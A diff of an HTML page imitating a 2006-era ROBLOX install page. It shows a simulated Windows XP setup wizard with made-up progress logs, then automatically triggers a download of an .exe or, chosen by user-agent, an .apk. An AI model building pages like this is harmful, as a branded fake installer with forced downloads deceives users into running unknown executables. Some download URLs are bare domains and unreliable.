@@ -1,152 +1,131 @@
-        <button id="action-btn" class="dl-btn" onclick="iniciarJanelaInstalador()">Download Now</button>
-    </div>
-</div>
+<!DOCTYPE html>
+<html lang="pt-br">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>ROBLOX.com - Install Client</title>
+    <style>
+        body { background-color: #E1E1E1; font-family: Verdana, sans-serif; margin: 0; padding: 0; }
+        .top-header { background-color: #000; color: #FFF; padding: 6px 10px; display: flex; justify-content: flex-end; font-size: 11px; }
+        .top-header a { color: #FFF; text-decoration: none; }
+        .main-banner { background-color: #000080; padding: 10px; border-bottom: 3px solid #E1E1E1; }
+        .nav-bar { background-color: #ECECEC; border-top: 1px solid #FFF; border-bottom: 1px solid #A0A0A0; padding: 8px 15px; display: flex; gap: 20px; font-weight: bold; font-size: 13px; }
+        .nav-bar a { color: #002E62; text-decoration: none; }
+        
+        .main-layout { padding: 30px; background-color: #FFF; margin: 10px; border: 1px solid #A0A0A0; text-align: center; min-height: 400px; }
+        
+        .download-box { border: 1px dashed #FF0000; padding: 25px; background: #FFFFAA; display: inline-block; width: 90%; max-width: 520px; box-shadow: 3px 3px 0px #999; }
+        
+        .dl-btn { background: #008000; color: white; border: 2px solid #004000; padding: 12px 25px; font-weight: bold; cursor: pointer; box-shadow: 2px 2px 0px #000; }
+        .update-btn { background: #FF8000; color: white; border: 2px solid #CC6600; padding: 12px 25px; font-weight: bold; cursor: pointer; box-shadow: 2px 2px 0px #000; }
 
-<!-- JANELA DO ASSISTENTE DE INSTALAÇÃO (WINDOWS XP STYLE) -->
-<div id="installer-screen" class="installer-overlay">
-    <div class="installer-window">
-        <div class="installer-title">
-            <span>ROBLOX Setup Wizard</span>
-            <span style="cursor:default;">X</span>
+        /* Estilo instalador XP */
+        .installer-overlay { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.7); z-index: 10000; align-items: center; justify-content: center; }
+        .installer-window { background: #ECE9D8; border: 2px solid #0054E3; width: 400px; padding: 15px; box-shadow: 4px 4px 10px #000; text-align: left; }
+        .installer-title { background: linear-gradient(to right, #0054E3, #267DFF); color: white; padding: 5px; font-weight: bold; margin: -15px -15px 15px -15px; }
+        .progress-container { background: white; border: 1px solid #7F9DB9; height: 20px; width: 100%; margin: 15px 0; }
+        .progress-bar { background: #30FA30; height: 100%; width: 0%; transition: width 0.1s; }
+        .installer-logs { font-family: monospace; font-size: 10px; background: #FFF; border: 1px solid #7F9DB9; padding: 5px; height: 60px; overflow-y: auto; }
+    </style>
+</head>
+<body>
+
+    <div class="top-header"><a href="#">Home</a></div>
+    <div class="main-banner"><h1 style="color:white; margin:0; font-style:italic;">ROBLOX</h1></div>
+    <div class="nav-bar"><a href="#">Home</a><a href="#">Games</a><a href="#">Install</a></div>
+
+    <div class="main-layout">
+        <div class="download-box">
+            <h2 id="install-title">Install ROBLOX Client</h2>
+            <p id="install-desc">Para construir e jogar, instale o cliente legacy de 2006.</p>
+            <div id="app-status" style="margin: 15px 0; font-weight: bold;">Status: Aguardando...</div>
+            <button id="action-btn" class="dl-btn" onclick="iniciarInstalacao()">Download Now</button>
         </div>
-        
-        <p style="margin: 5px 0;"><strong>Installing:</strong> ROBLOX Sandbox Client v1.0.2006</p>
-        <p id="installer-current-action" style="color: #444; margin: 5px 0;">Extracting setup resources...</p>
-        
-        <div class="progress-container">
-            <div id="setup-progress" class="progress-bar"></div>
-        </div>
-        
-        <div id="setup-logs" class="installer-logs">Initializing CaBlox system hooks...</div>
     </div>
-</div>
 
-<script>
-let nomeDoSetupParaBaixar = "RobloxPlayer2006PC.exe";
-let nomeDoAppFinal = "RobloxPlayer2006.exe";
-let URL_DO_APK_REAL = "_Roblox_2006_19817695.apk"; 
-let isMobile = false;
+    <div id="installer-screen" class="installer-overlay">
+        <div class="installer-window">
+            <div class="installer-title">ROBLOX Setup Wizard</div>
+            <p id="installer-current-action">Iniciando...</p>
+            <div class="progress-container"><div id="setup-progress" class="progress-bar"></div></div>
+            <div id="setup-logs" class="installer-logs"></div>
+        </div>
+    </div>
 
-// Detector CaBlox AI V1.08 integrado para descobrir o arquivo correto
-function detectarAparelhoEConfigurar() {
-    const ua = navigator.userAgent;
+    <script>
+        let nomeDoSetupParaBaixar = "RobloxPlayer2006PC.exe";
+        let isMobile = false;
 
-    if (/Mobi|Android|iPhone|iPad|Tablet/i.test(ua)) {
-        isMobile = true;
-        nomeDoSetupParaBaixar = "_Roblox_2006_19817695.apk";
-        nomeDoAppFinal = "_Roblox_2006_19817695.apk";
-        
-        // CORRIGIDO: LINK PÚBLICO DA SUA PAGES
-        URL_DO_APK_REAL = "https://github.io";
-        
-    } else {
-        isMobile = false;
-        nomeDoSetupParaBaixar = "RobloxPlayer2006PC.exe";
-        nomeDoAppFinal = "RobloxPlayer2006.exe";
-        URL_DO_APK_REAL = "RobloxPlayer2006.exe";
-    }
+        // Função para atualizar a interface baseada no estado
+        function atualizarUI() {
+            const instalado = localStorage.getItem('roblox_installed') === 'true';
+            const btn = document.getElementById('action-btn');
+            const status = document.getElementById('app-status');
 
-    verificarEstadoDoApp();
-}
-
-function verificarEstadoDoApp() {
-    const foiInstalado = localStorage.getItem('roblox_2006_installed') === 'true';
-    const titulo = document.getElementById('install-title');
-    const desc = document.getElementById('install-desc');
-    const status = document.getElementById('app-status');
-    const botao = document.getElementById('action-btn');
-
-    if (foiInstalado) {
-        titulo.innerText = "ROBLOX Client Up to Date";
-        desc.innerHTML = `The 2006 legacy sandbox client (${nomeDoAppFinal}) is already successfully configured on your machine.`;
-        status.innerHTML = `App Status: <span style="color: green;">✔ Installed (${isMobile ? 'Mobile App' : 'PC App'})</span>`;
-
-        botao.innerText = "Check for Updates";
-        botao.className = "update-btn";
-        botao.setAttribute("onclick", "buscarUpdates()");
-    } else {
-        titulo.innerText = `Install ROBLOX for ${isMobile ? 'Mobile' : 'PC'}`;
-        status.innerHTML = `App Status: <span style="color: red;">⚠ Download Recommended: (${nomeDoSetupParaBaixar})</span>`;
-        botao.innerText = "Download Now";
-        botao.className = "dl-btn";
-        botao.setAttribute("onclick", "iniciarJanelaInstalador()");
-    }
-}
-
-// DISPARA O EXECUTÁVEL DE CARREGAMENTO DIRETO NO SITE
-function iniciarJanelaInstalador() {
-    alert(`Baixando o assistente inicial: ${nomeDoSetupParaBaixar}. Aguarde a execução automática.`);
-
-    // Abre a tela do instalador Windows XP style
-    const telaInstalador = document.getElementById('installer-screen');
-    telaInstalador.style.display = "flex";
-
-    const barra = document.getElementById('setup-progress');
-    const textoAcao = document.getElementById('installer-current-action');
-    const logsBox = document.getElementById('setup-logs');
-
-    let progresso = 0;
-    logsBox.innerHTML = `[START] Executing ${nomeDoSetupParaBaixar}...`;
-
-    // Linhas de log que vão aparecendo conforme a instalação avança
-    const passosDoInstalador = [
-        { p: 15, txt: "Unpacking main game assets...", log: "<br>[INFO] Extracting maps: Chaos Canyon, Crossroads..." },
-        { p: 40, txt: "Configuring graphics sandbox layers...", log: "<br>[RENDER] Setting up GDI+ rendering pipelines..." },
-        { p: 65, txt: "Injecting CaBlox AI client validation protocols...", log: "<br>[SECURITY] Storage sandbox linked into system." },
-        { p: 85, txt: "Creating desktop and application shortcuts...", log: "<br>[LINK] Executable routes pointing to play.html" },
-        { p: 100, txt: "Installation complete! Packaging final client...", log: "<br>[SUCCESS] Core registry keys configured successfully." }
-    ];
-
-    // Intervalo que faz a barra encher simulando a instalação real
-    const intervaloInstalacao = setInterval(() => {
-        progresso += 2;
-        barra.style.width = progresso + "%";
-
-        // Checa se bateu em algum passo de log para atualizar o texto da tela
-        passosDoInstalador.forEach(passo => {
-            if (progresso === passo.p) {
-                textoAcao.innerText = passo.txt;
-                logsBox.innerHTML += passo.log;
-                logsBox.scrollTop = logsBox.scrollHeight;
+            // Detecta celular ou tablet
+            if (/Mobi|Android|iPhone|iPad|Tablet/i.test(navigator.userAgent)) {
+                isMobile = true;
+                nomeDoSetupParaBaixar = "_Roblox_2006_19817695.apk";
             }
-        });
 
-        if (progresso >= 100) {
-            clearInterval(intervaloInstalacao);
-
-            setTimeout(() => {
-                // Fecha o instalador de carregamento
-                telaInstalador.style.display = "none";
-
-                // DISPARA O DOWNLOAD AUTOMÁTICO DO SEU APK REAL
-                alert(`Instalação Concluída! Baixando agora o arquivo final: ${nomeDoAppFinal}`);
-                dispararDownloadFisico(URL_DO_APK_REAL, nomeDoAppFinal);
-
-                // Salva o estado no localStorage do navegador
-                localStorage.setItem('roblox_2006_installed', 'true');
-                detectarAparelhoEConfigurar();
-            }, 800);
+            if (instalado) {
+                document.getElementById('install-title').innerText = "Cliente Instalado";
+                status.innerHTML = "Status: <span style='color:green'>✓ Pronto para jogar</span>";
+                btn.innerText = "Check Updates";
+                btn.className = "update-btn";
+                btn.onclick = () => alert("Você já está na versão mais recente!");
+            }
         }
-    }, 80); // Velocidade do carregamento
-}
 
-// BUSCA O ARQUIVO DIRETO NO LINK CORRETO DO SEU SITE
-function dispararDownloadFisico(urlArquivo, nomeVisivel) {
-    const link = document.createElement('a');
-    link.href = urlArquivo; 
-    link.download = nomeVisivel; 
-    document.body.appendChild(link);
-    link.click();
-    document.body.removeChild(link);
-}
+        function iniciarInstalacao() {
+            document.getElementById('installer-screen').style.display = "flex";
+            let progresso = 0;
+            const barra = document.getElementById('setup-progress');
+            const log = document.getElementById('setup-logs');
+            const acao = document.getElementById('installer-current-action');
 
-function buscarUpdates() {
-    alert('Buscando patches de otimização nos servidores da CaBlox AI...');
-    alert('Seu aplicativo já está sincronizado na build mais estável e recente (v1.0.2006)!');
-}
+            const intervalo = setInterval(() => {
+                progresso += 2;
+                barra.style.width = progresso + "%";
 
-// Roda os rastreadores assim que a janela carrega
-window.onload = detectarAparelhoEConfigurar;
-</script>
+                if(progresso == 20) { acao.innerText = "Extraindo arquivos..."; log.innerHTML += "<br>> Unpacking assets..."; }
+                if(progresso == 60) { acao.innerText = "Configurando engine..."; log.innerHTML += "<br>> Setting up GDI+..."; }
+                
+                if (progresso >= 100) {
+                    clearInterval(intervalo);
+                    localStorage.setItem('roblox_installed', 'true');
+                    setTimeout(() => {
+                        document.getElementById('installer-screen').style.display = "none";
+                        alert("Instalação simulada concluída com sucesso!");
+                        
+                        // Dispara o download invisível que puxa o arquivo
+                        dispararDownloadReal();
+                        
+                        atualizarUI();
+                    }, 500);
+                }
+            }, 50);
+        }
+
+        // Função corrigida com link direto de arquivo bruto (evita redirecionamento)
+        function dispararDownloadReal() {
+            const link = document.createElement('a');
+            
+            if (isMobile) {
+                // Link bruto do servidor do GitHub para iniciar o download direto na barra do celular
+                link.href = "https://githubusercontent.com";
+                link.download = "_Roblox_2006_19817695.apk";
+            } else {
+                link.href = nomeDoSetupParaBaixar;
+                link.download = nomeDoSetupParaBaixar;
+            }
+            
+            document.body.appendChild(link);
+            link.click();
+            document.body.removeChild(link);
+        }
+
+        window.onload = atualizarUI;
+    </script>
 </body>
 </html>
